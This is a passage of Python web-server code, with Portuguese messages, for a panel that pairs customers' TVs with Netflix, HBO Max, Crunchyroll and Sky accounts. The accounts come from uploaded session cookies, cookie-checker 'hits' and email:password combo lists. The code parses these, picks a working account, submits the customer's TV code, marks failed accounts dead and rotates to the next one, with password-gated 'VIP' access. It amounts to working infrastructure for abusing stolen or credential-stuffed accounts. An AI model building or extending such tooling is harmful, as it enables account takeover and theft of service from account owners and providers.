                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_filter_plan()
        elif raw_path == '/api/admin/upload-cookies':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_upload_cookies()
        elif raw_path == '/api/admin/sky-tokens':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_save_sky_tokens()
        elif raw_path == '/api/admin/reset-cache':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_reset_cache()
        else:
            self.send_error(404, "Endpoint not found")

    def send_json_response(self, data: dict, status_code: int = 200):
        try:
            body = json.dumps(data, ensure_ascii=False).encode('utf-8')
            self.send_response(status_code)
            self.send_header('Content-Type', 'application/json; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            pass
        except Exception:
            pass

    def handle_api_status(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY

        try:
            all_netflix = get_all_netflix_accounts()
        except Exception:
            all_netflix = []

        try:
            all_hbo = get_all_hbo_accounts()
        except Exception:
            all_hbo = []

        try:
            all_cr = get_all_crunchyroll_accounts()
        except Exception:
            all_cr = []

        try:
            all_sky = get_all_sky_accounts()
        except Exception:
            all_sky = []

        # ⚡ Validação e seleção instantânea da conta pronta para cada serviço
        try:
            if CURRENT_NETFLIX_READY is None or (CURRENT_NETFLIX_READY and (CURRENT_NETFLIX_READY.get("file") in DEAD_NETFLIX_COOKIES or CURRENT_NETFLIX_READY.get("file") in tv2.DEAD_COOKIES)):
                CURRENT_NETFLIX_READY = find_netflix_valid_cookie()
            if CURRENT_NETFLIX_READY is None and all_netflix:
                CURRENT_NETFLIX_READY = all_netflix[0]
        except Exception:
            if all_netflix:
                CURRENT_NETFLIX_READY = all_netflix[0]

        try:
            if CURRENT_HBO_READY is None or (CURRENT_HBO_READY and (CURRENT_HBO_READY.get("file") in DEAD_HBO_COOKIES or os.path.basename(CURRENT_HBO_READY.get("file", "")) in DEAD_HBO_COOKIES)):
                CURRENT_HBO_READY = find_hbo_valid_cookie()
            if CURRENT_HBO_READY is None and all_hbo:
                CURRENT_HBO_READY = all_hbo[0]
        except Exception:
            if all_hbo:
                CURRENT_HBO_READY = all_hbo[0]

        try:
            if CURRENT_CRUNCHYROLL_READY is None or (CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email") in DEAD_CRUNCHYROLL_ACCOUNTS):
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
            if CURRENT_CRUNCHYROLL_READY is None and all_cr:
                CURRENT_CRUNCHYROLL_READY = all_cr[0]
        except Exception:
            if all_cr:
                CURRENT_CRUNCHYROLL_READY = all_cr[0]

        try:
            curr_sky_em = CURRENT_SKY_READY.get("email", "").strip().lower() if CURRENT_SKY_READY else ""
            if CURRENT_SKY_READY is None or (curr_sky_em and curr_sky_em in DEAD_SKY_ACCOUNTS):
                CURRENT_SKY_READY = find_sky_valid_account()
            if CURRENT_SKY_READY is None and all_sky:
                CURRENT_SKY_READY = all_sky[0]
        except Exception:
            if all_sky:
                CURRENT_SKY_READY = all_sky[0]

        active_nf_file = CURRENT_NETFLIX_READY.get("file", "") if CURRENT_NETFLIX_READY else ""
        active_nf_bname = os.path.basename(active_nf_file) if active_nf_file else ""

        nf_queue = [
            {
                "filename": os.path.basename(e.get("file", "")),
                "email": e.get("info", {}).get("email", os.path.basename(e.get("file", ""))),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Premium VIP"),
                "is_selected": (os.path.basename(e.get("file", "")) == active_nf_bname),
                "is_verified": e.get("validated", False)
            }
            for e in all_netflix[:30] if isinstance(e, dict) and os.path.basename(e.get("file", "")) != active_nf_bname
        ]

        active_hbo_file = CURRENT_HBO_READY.get("file", "") if CURRENT_HBO_READY else ""
        active_hbo_bname = os.path.basename(active_hbo_file) if active_hbo_file else ""

        hbo_queue = [
            {
                "filename": os.path.basename(e.get("file", "")),
                "email": e.get("info", {}).get("email", "HBO Max VIP"),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "HBO Max VIP"),
                "is_selected": (os.path.basename(e.get("file", "")) == active_hbo_bname),
                "is_verified": e.get("validated", False)
            }
            for e in all_hbo[:30] if isinstance(e, dict) and os.path.basename(e.get("file", "")) != active_hbo_bname
        ]

        active_cr_email = CURRENT_CRUNCHYROLL_READY.get("email", "") if CURRENT_CRUNCHYROLL_READY else ""

        cr_queue = [
            {
                "filename": e.get("email") or e.get("file", "combo"),
                "email": e.get("info", {}).get("email", e.get("email", "Crunchyroll VIP")),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Crunchyroll VIP"),
                "is_selected": (e.get("email") == active_cr_email),
                "is_verified": e.get("validated", False)
            }
            for e in all_cr[:30] if isinstance(e, dict) and e.get("email") != active_cr_email
        ]

        active_sky_email = CURRENT_SKY_READY.get("email", "") if CURRENT_SKY_READY else ""

        sky_queue = [
            {
                "filename": e.get("email") or e.get("file", "skycontas.txt"),
                "email": e.get("info", {}).get("email", e.get("email", "Sky TV VIP")),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Sky TV VIP"),
                "client_name": e.get("info", {}).get("client_name", ""),
                "is_selected": (e.get("email") == active_sky_email),
                "is_verified": e.get("validated", False)
            }
            for e in all_sky[:30] if isinstance(e, dict) and e.get("email") != active_sky_email
        ]

        nf_count = len(all_netflix)
        hbo_count = len(all_hbo)
        cr_count = len(all_cr)
        sky_count = len(all_sky)

        res = {
            "netflix": {
                "total_in_vault": nf_count,
                "available_count": nf_count,
                "has_account": CURRENT_NETFLIX_READY is not None,
                "account": CURRENT_NETFLIX_READY.get("info") if CURRENT_NETFLIX_READY else None,
                "cookie_name": os.path.basename(CURRENT_NETFLIX_READY.get("file", "")) if (CURRENT_NETFLIX_READY and CURRENT_NETFLIX_READY.get("file")) else (CURRENT_NETFLIX_READY.get("email") if CURRENT_NETFLIX_READY else None),
                "cookie_queue": nf_queue
            },
            "hbo": {
                "total_in_vault": hbo_count,
                "available_count": hbo_count,
                "has_account": CURRENT_HBO_READY is not None,
                "account": CURRENT_HBO_READY.get("info") if CURRENT_HBO_READY else None,
                "cookie_name": os.path.basename(CURRENT_HBO_READY.get("file", "")) if (CURRENT_HBO_READY and CURRENT_HBO_READY.get("file")) else (CURRENT_HBO_READY.get("email") if CURRENT_HBO_READY else None),
                "cookie_queue": hbo_queue
            },
            "crunchyroll": {
                "total_in_vault": cr_count,
                "available_count": cr_count,
                "has_account": CURRENT_CRUNCHYROLL_READY is not None,
                "account": CURRENT_CRUNCHYROLL_READY.get("info") if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_name": CURRENT_CRUNCHYROLL_READY.get("email") if CURRENT_CRUNCHYROLL_READY else None,
                "cookie_queue": cr_queue
            },
            "sky": {
                "total_in_vault": sky_count,
                "available_count": sky_count,
                "has_account": CURRENT_SKY_READY is not None,
                "account": CURRENT_SKY_READY.get("info") if CURRENT_SKY_READY else None,
                "cookie_name": CURRENT_SKY_READY.get("email") if CURRENT_SKY_READY else None,
                "cookie_queue": sky_queue
            },
            "local_ip": get_local_ip(),
            "port": PORT
        }

        session = self.get_session_info()
        auth_token = self.get_auth_token_str()
        ua = self.headers.get('User-Agent', '')
        client_ip = self.get_client_ip()
        role_name = session.get("role_name", "Acesso VIP") if session else "Acesso VIP"
        
        # Registra heartbeat em tempo real
        track_client_heartbeat(client_ip, auth_token, ua, role_name, "")

        res["allowed_services"] = session.get("services", ["netflix", "hbo", "crunchyroll", "sky"]) if session else ["netflix", "hbo", "crunchyroll", "sky"]
        res["role_name"] = role_name
        res["server_version"] = SERVER_DATA_VERSION
        res["online_users"] = get_online_users_data()

        self.send_json_response(res)

    def handle_api_skip_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        now_ts = time.time()
        if service == 'netflix':
            if CURRENT_NETFLIX_READY and CURRENT_NETFLIX_READY.get("file"):
                f = CURRENT_NETFLIX_READY["file"]
                tv2.LAST_USED_AT[f] = now_ts
                tv2.LAST_USED_AT[os.path.basename(f)] = now_ts
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        elif service == 'crunchyroll':
            if CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email"):
                CR_LAST_USED_AT[CURRENT_CRUNCHYROLL_READY["email"]] = now_ts
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        elif service == 'sky':
            if CURRENT_SKY_READY:
                em = CURRENT_SKY_READY.get("email", "").strip().lower()
                if em:
                    sky_service.record_account_activated(em, "", "SKIP")
            sky_service.load_all_sky_accounts(force_reload=True)
            CURRENT_SKY_READY = find_sky_valid_account()
        else:
            if CURRENT_HBO_READY and CURRENT_HBO_READY.get("file"):
                f = CURRENT_HBO_READY["file"]
                HBO_LAST_USED_AT[f] = now_ts
                HBO_LAST_USED_AT[os.path.basename(f)] = now_ts
            CURRENT_HBO_READY = find_hbo_valid_cookie()

        self.handle_api_status()

    def handle_api_activate(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido na requisição."}, 400)

        service = req.get('service', 'netflix')

        # 🔒 Bloqueio rigoroso se a senha não tiver acesso a este streaming
        if not self.is_service_allowed(service):
            s_name = "Crunchyroll" if service == 'crunchyroll' else ("HBO Max" if service == 'hbo' else ("Sky+" if service == 'sky' else "Netflix"))
            return self.send_json_response({
                "success": False,
                "message": f"🔒 VOCÊ NÃO TEM ACESSO A ESSE CONTEÚDO! ({s_name} bloqueado pela sua senha)."
            }, 403)

        tv_code = req.get('code', '').strip()

        if not tv_code:
            return self.send_json_response({"success": False, "message": "Por favor, digite o código exibido na TV."}, 400)

        clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()

        if service == 'netflix':
            last_msg = ""
            for _attempt in range(3):
                if CURRENT_NETFLIX_READY is None or (CURRENT_NETFLIX_READY and (CURRENT_NETFLIX_READY.get("file") in DEAD_NETFLIX_COOKIES or CURRENT_NETFLIX_READY.get("file") in tv2.DEAD_COOKIES)):
                    CURRENT_NETFLIX_READY = find_netflix_valid_cookie()

                if not CURRENT_NETFLIX_READY:
                    return self.send_json_response({
                        "success": False,
                        "message": "Nenhum cookie Netflix válido disponível no momento."
                    }, 404)

                used_account = CURRENT_NETFLIX_READY
                used_file = used_account.get("file", "")
                success, msg, info = activate_netflix_tv(clean_code, used_account)
                account_info = info or used_account.get("info", {})
                last_msg = msg

                if success:
                    now_ts = time.time()
                    tv2.LAST_USED_AT[used_file] = now_ts
                    tv2.LAST_USED_AT[os.path.basename(used_file)] = now_ts
                    record_history_entry("Netflix", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "Netflix"), "Sucesso")
                    CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=used_file)
                    return self.send_json_response({
                        "success": True,
                        "message": msg or "TV pareada e ativada com sucesso!",
                        "account": account_info
                    })
                else:
                    # Se for código de TV inválido ou expirado, encerra sem queimar o cookie
                    if any(k in msg.lower() for k in ["código", "codigo", "expirou", "inválido", "invalido", "recusado", "já utilizado"]):
                        return self.send_json_response({
                            "success": False,
                            "message": msg
                        })

                    # Erro de sessão do cookie: descarta cookie morto e tenta a próxima conta válida
                    DEAD_NETFLIX_COOKIES.add(used_file)
                    tv2.DEAD_COOKIES.add(used_file)
                    CURRENT_NETFLIX_READY = find_netflix_fast_cookie(exclude_file=used_file)

            return self.send_json_response({
                "success": False,
                "message": last_msg or "Falha ao parear com a TV."
            })

        elif service == 'hbo':
            if CURRENT_HBO_READY is None:
                CURRENT_HBO_READY = find_hbo_valid_cookie()

            if not CURRENT_HBO_READY:
                return self.send_json_response({
                    "success": False,
                    "message": "Nenhum cookie HBO Max ativo encontrado nas pastas."
                }, 404)

            used_file = CURRENT_HBO_READY["file"]
            success, msg, info = activate_hbo_tv(clean_code, CURRENT_HBO_READY)
            account_info = info or CURRENT_HBO_READY.get("info", {})

            if success:
                now_ts = time.time()
                HBO_LAST_USED_AT[used_file] = now_ts
                HBO_LAST_USED_AT[os.path.basename(used_file)] = now_ts
                record_history_entry("HBO Max", used_file, account_info.get("email", ""), clean_code, account_info.get("plan", "HBO Max VIP"), "Sucesso")
                CURRENT_HBO_READY = find_hbo_valid_cookie()
                return self.send_json_response({
                    "success": True,
                    "message": msg,
                    "account": account_info
                })
            else:
                if "expirou" in msg.lower() or "sessão" in msg.lower():
                    CURRENT_HBO_READY = find_hbo_valid_cookie()
                return self.send_json_response({
                    "success": False,
                    "message": msg
                })

        elif service == 'crunchyroll':
            if CURRENT_CRUNCHYROLL_READY is None:
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

            if not CURRENT_CRUNCHYROLL_READY:
                return self.send_json_response({
                    "success": False,
                    "message": "Nenhuma conta Crunchyroll premium encontrada nos combos."
                }, 404)

            used_account = CURRENT_CRUNCHYROLL_READY
            success, msg, info = activate_crunchyroll_tv(clean_code, used_account)
            account_info = info or used_account.get("info", {})

            if success:
                now_ts = time.time()
                CR_LAST_USED_AT[used_account["email"]] = now_ts
                record_history_entry("Crunchyroll", used_account.get("file", "combo.txt"), account_info.get("email", ""), clean_code, account_info.get("plan", "Crunchyroll VIP"), "Sucesso")
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                return self.send_json_response({
                    "success": True,
                    "message": msg,
                    "account": account_info
                })
            else:
                if "sessão" in msg.lower() or "token" in msg.lower() or "wrong_creds" in msg.lower():
                    DEAD_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
                    CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                return self.send_json_response({
                    "success": False,
                    "message": msg
                })

        elif service == 'sky':
            # Loop automático: se a conta atual falhar (ex: sem Sky+ liberado), tenta automaticamente a próxima conta até ter sucesso!
            last_msg = ""
            for _attempt in range(5):
                if CURRENT_SKY_READY is None:
                    CURRENT_SKY_READY = find_sky_valid_account()

                if not CURRENT_SKY_READY:
                    break

                used_account = CURRENT_SKY_READY
                success, msg, info = activate_sky_tv(clean_code, used_account)
                account_info = info or used_account.get("info", {})
                last_msg = msg

                if success:
                    acc_email = used_account.get("email", "").strip().lower()
                    record_history_entry("Sky", used_account.get("file", "hits"), account_info.get("email", ""), clean_code, account_info.get("plan", "Sky TV VIP"), "Sucesso")
                    sky_service.record_account_activated(used_account.get("email", ""), used_account.get("password", ""), clean_code)
                    sky_service.load_all_sky_accounts(force_reload=True)
                    CURRENT_SKY_READY = find_sky_valid_account()
                    return self.send_json_response({
                        "success": True,
                        "message": msg,
                        "account": account_info
                    })
                else:
                    # Se for código de TV inexistente ou expirado na Smart TV (404), interrompe
                    if "404" in msg.lower() or "não encontrado" in msg.lower() or "expirado" in msg.lower():
                        return self.send_json_response({
                            "success": False,
                            "message": msg
                        })

                    # A conta falhou (ex: sem streaming Sky+, senha inválida etc.)
                    # Marca como indisponível e tenta IMEDIATAMENTE a próxima conta da fila!
                    acc_email = used_account.get("email", "").strip().lower()
                    if acc_email:
                        DEAD_SKY_ACCOUNTS.add(acc_email)
                    sky_service.load_all_sky_accounts(force_reload=True)
                    CURRENT_SKY_READY = find_sky_valid_account()

            return self.send_json_response({
                "success": False,
                "message": last_msg or "Falha ao ativar a TV com as contas disponíveis."
            })
        else:
            return self.send_json_response({"success": False, "message": "Serviço desconhecido."}, 400)

    def handle_api_cookies(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        query_service = 'netflix'
        if 'service=hbo' in self.path:
            query_service = 'hbo'
        elif 'service=crunchyroll' in self.path:
            query_service = 'crunchyroll'
        elif 'service=sky' in self.path:
            query_service = 'sky'

        if not self.is_service_allowed(query_service):
            return self.send_json_response({
                "service": query_service,
                "total_valid": 0,
                "active_cookie": "",
                "cookies": [],
                "blocked": True,
                "message": "🔒 Você não tem acesso a esse conteúdo."
            })

        if query_service == 'netflix':
            all_accounts = get_all_netflix_accounts()
            active_file = os.path.basename(CURRENT_NETFLIX_READY["file"]) if CURRENT_NETFLIX_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Premium VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        elif query_service == 'crunchyroll':
            all_accounts = get_all_crunchyroll_accounts()
            active_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""
            items = []
            for entry in all_accounts:
                email = entry["info"].get("email", entry.get("file", ""))
                acc = entry["info"]
                items.append({
                    "filename": email,
                    "email": email,
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Crunchyroll VIP"),
                    "is_selected": (email == active_email),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        elif query_service == 'sky':
            try:
                all_accounts = get_all_sky_accounts()
            except Exception:
                all_accounts = []
            active_email = CURRENT_SKY_READY.get("email", "") if CURRENT_SKY_READY else ""
            items = []
            for entry in all_accounts:
                if not isinstance(entry, dict):
                    continue
                acc = entry.get("info", {})
                email = acc.get("email") or entry.get("email") or entry.get("file", "skycontas.txt")
                items.append({
                    "filename": email,
                    "email": email,
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Sky TV VIP"),
                    "client_name": acc.get("client_name", ""),
                    "is_selected": (email == active_email),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
            items = items[:150]
        else:
            all_accounts = get_all_hbo_accounts()
            active_file = os.path.basename(CURRENT_HBO_READY["file"]) if CURRENT_HBO_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "HBO Max VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])

        self.send_json_response({
            "service": query_service,
            "total_valid": len(items),
            "active_cookie": active_email if (query_service in ['crunchyroll', 'sky']) else active_file,
            "cookies": items
        })

    def handle_api_select_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')
        filename = req.get('filename', '').strip()

        if not filename:
            return self.send_json_response({"success": False, "message": "Nome do arquivo ausente."}, 400)

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        if service == 'netflix':
            selected = select_netflix_cookie_by_filename(filename)
            if selected:
                CURRENT_NETFLIX_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Este cookie não está mais ativo na Netflix."}, 404)
        elif service == 'crunchyroll':
            selected = select_crunchyroll_account_by_identifier(filename)
            if selected:
                CURRENT_CRUNCHYROLL_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta Crunchyroll {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": selected.get("email", filename)
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar esta conta Crunchyroll."}, 404)
        elif service == 'sky':
            selected = select_sky_account_by_identifier(filename)
            if selected:
                CURRENT_SKY_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta Sky {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": selected.get("email", filename)
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível selecionar esta conta Sky."}, 404)
        else:
            selected = select_hbo_cookie_by_filename(filename)
            if selected:
                CURRENT_HBO_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta HBO {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar este cookie HBO Max."}, 404)

    def handle_api_filter_plan(self):
        return self.send_json_response({"success": True, "message": "Plano atualizado."})

    def handle_api_history(self):
        history = load_history()
        self.send_json_response({"history": history})

    def handle_api_upload_cookies(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        global_service = req.get('service', 'auto').lower()
        files = req.get('files', [])  # list of {"name": "...", "content": "..."}
        raw_text = req.get('raw_text', '').strip()

        saved_netflix = 0
        saved_hbo = 0
        saved_crunchyroll = 0
        saved_sky = 0

        def detect_service_for_text(text: str, filename: str = "") -> str:
            lower = (text + " " + filename).lower()
            if 'sky' in lower or 'vrio' in lower or 'skymais' in lower or 'assinatura 1:' in lower:
                return 'sky'
            if global_service in ['sky', 'skymais']:
                return 'sky'
            if 'crunchyroll' in lower or 'crunchy' in lower:
                return 'crunchyroll'
            if global_service in ['crunchyroll', 'cr']:
                return 'crunchyroll'
            if ('@' in text and (':' in text or '|' in text)) and ('securentflxid' not in lower and 'max.com' not in lower and 'st=' not in lower and 'netflix' not in lower):
                return 'crunchyroll'
            if 'securentflxid' in lower or 'netflix' in lower:
                return 'netflix'
            elif 'max.com' in lower or 'hbomax' in lower or 'beam' in lower or 'hbo' in lower:
                return 'hbomax'
            if global_service in ['hbo', 'hbomax', 'max']:
                return 'hbomax'
            return 'netflix'

        def save_cookie_content(svc: str, fname: str, content: str, append_mode: bool = False) -> bool:
            nonlocal saved_netflix, saved_hbo, saved_crunchyroll, saved_sky
            if svc == 'sky':
                base_f = os.path.basename(fname).lower()
                if base_f == 'sso_token.txt' or (base_f.endswith('.txt') and 'sso' in base_f and 'ey' in content):
                    sky_service.save_sso_token(content)
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.clear()
                    USED_SKY_ACCOUNTS.clear()
                    return True
                elif base_f == 'profile_token.txt' or (base_f.endswith('.txt') and 'profile' in base_f and 'ey' in content):
                    sky_service.save_profile_token(content)
                    saved_sky += 1
                    return True
                elif 'ey' in content and ('"dtvgo"' in content or '"sm-dgo"' in content or '"sky_br"' in content):
                    sky_service.save_sso_token(content)
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.clear()
                    USED_SKY_ACCOUNTS.clear()
                    return True

                added = sky_service.save_sky_hits(content)
                saved_sky += added
                DEAD_SKY_ACCOUNTS.clear()
                USED_SKY_ACCOUNTS.clear()
                return True
            elif svc == 'crunchyroll':
                target_dir = CRUNCHYROLL_COMBO_FOLDER
            elif svc in ['hbo', 'hbomax', 'max']:
                target_dir = HBO_COOKIES_FOLDER
            else:
                target_dir = NETFLIX_COOKIES_FOLDER
            os.makedirs(target_dir, exist_ok=True)
            clean_name = re.sub(r'[^a-zA-Z0-9_\-\.\[\]@]', '_', os.path.basename(fname))
            if not clean_name.endswith('.txt') and not clean_name.endswith('.json'):
                clean_name += '.txt'
            fpath = os.path.join(target_dir, clean_name)
            try:
                mode = 'a' if (append_mode and os.path.exists(fpath)) else 'w'
                with open(fpath, mode, encoding='utf-8') as out_f:
                    if mode == 'a':
                        out_f.write('\n' + content.strip() + '\n')
                    else:
                        out_f.write(content)
                if svc == 'crunchyroll':
                    c_lines = [l for l in content.splitlines() if (':' in l or '|' in l) and '@' in l]
                    saved_crunchyroll += max(1, len(c_lines))
                    DEAD_CRUNCHYROLL_ACCOUNTS.clear()
                    USED_CRUNCHYROLL_ACCOUNTS.clear()
                elif svc in ['hbo', 'hbomax', 'max']:
                    saved_hbo += 1
                    USED_HBO_COOKIES.discard(fpath)
                    USED_HBO_COOKIES.discard(clean_name)
                else:
                    saved_netflix += 1
                    DEAD_NETFLIX_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(clean_name)
                return True
            except Exception:
                return False

        def split_multiple_raw_cookies(text: str) -> List[str]:
            """Divide de forma inteligente lotes colados de cookies ou combos em itens separados sem corrompê-los."""
            text = text.strip()
            if not text:
                return []

            # 1. Se for lista de combos (Crunchyroll/Sky: email:senha linha a linha)
            lines = [line.strip() for line in text.splitlines() if line.strip()]
            combo_lines = [l for l in lines if re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+[:|][^\s]+', l)]
            if len(combo_lines) >= 1 and len(combo_lines) == len(lines):
                return [text]

            # 2. Se contiver múltiplos blocos do formato padrão de checadores (ex: NETFLIX COOKIE CHECKER — HIT)
            checker_pattern = re.compile(r'(?:^|\r?\n)(?=[=]{10,}\s*\r?\n\s*NETFLIX COOKIE CHECKER)', re.MULTILINE)
            checker_parts = [p.strip() for p in checker_pattern.split(text) if p.strip()]
            if len(checker_parts) > 1:
                valid_hits = [p for p in checker_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'Email:', '📧'])]
                if valid_hits:
                    return valid_hits

            # 3. Se contiver múltiplos cookies Netscape com SecureNetflixId ou NetflixId
            netscape_pattern = re.compile(r'(?:^|\r?\n)(?=(?:\.netflix\.com|netflix\.com)\t[^\r\n]*\t(?:SecureNetflixId|NetflixId)\t)', re.MULTILINE)
            netscape_parts = [p.strip() for p in netscape_pattern.split(text) if p.strip()]
            if len(netscape_parts) > 1:
                return netscape_parts

            # 4. Se contiver múltiplos tokens HBO Max (st=eyJ...)
            st_matches = list(re.finditer(r'(?:st=)(eyJ[a-zA-Z0-9_\-\.]+)', text))
            if len(st_matches) > 1:
                return [f"st={m.group(1)}" for m in st_matches]

            # 5. Se contiver delimitadores explícitos de lotes (ex: 5 ou mais '=', '-', ou '#') onde cada bloco tem cookie
            delim_pattern = re.compile(r'\r?\n\s*[-=#]{5,}\s*\r?\n')
            delim_parts = [p.strip() for p in delim_pattern.split(text) if p.strip()]
            valid_delim = [p for p in delim_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'st=', '@'])]
            if len(valid_delim) > 1:
                return valid_delim

            return [text]

        # 0. Suporte direto a conta única (Crunchyroll ou Sky) via JSON { "email": "...", "password": "...", "service": "..." }
        single_email = req.get('email', '').strip()
        single_pwd = req.get('password', '').strip() or req.get('pwd', '').strip()

        if global_service == 'sky' or req.get('service') == 'sky':
            if single_email and single_pwd:
                if sky_service.save_single_sky_account(single_email, single_pwd):
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.discard(single_email)
                    USED_SKY_ACCOUNTS.discard(single_email)
        elif single_email and single_pwd and ('@' in single_email):
            save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', f"{single_email}:{single_pwd}", append_mode=True)

        # 1. Processa múltiplos arquivos (da pasta inteira arrastada ou selecionada)
        for idx, item in enumerate(files):
            fname = item.get('name', '').strip() or f"cookie_{idx + 1}.txt"
            content = item.get('content', '').strip()
            if not content:
                continue

            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(content, fname)
            save_cookie_content(svc, fname, content)

        # 2. Processa texto bruto (pode conter 1 cookie, lote de cookies ou lista de contas Crunchyroll/Sky)
        if raw_text:
            timestamp = int(time.time())
            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")

            if svc == 'sky':
                added = sky_service.save_sky_hits(raw_text)
                saved_sky += added
                DEAD_SKY_ACCOUNTS.clear()
                USED_SKY_ACCOUNTS.clear()
            elif svc == 'crunchyroll' or ((':' in raw_text or '|' in raw_text) and '@' in raw_text and 'netflix' not in raw_text.lower() and 'securentflxid' not in raw_text.lower()):
                save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', raw_text, append_mode=True)
            else:
                is_json = raw_text.startswith('[') or raw_text.startswith('{')
                if is_json:
                    try:
                        parsed_json = json.loads(raw_text)
                        if isinstance(parsed_json, list) and parsed_json and isinstance(parsed_json[0], dict) and 'name' in parsed_json[0]:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                        elif isinstance(parsed_json, list) and parsed_json and (isinstance(parsed_json[0], list) or isinstance(parsed_json[0], dict)):
                            for sub_idx, sub_item in enumerate(parsed_json):
                                sub_content = json.dumps(sub_item, indent=2)
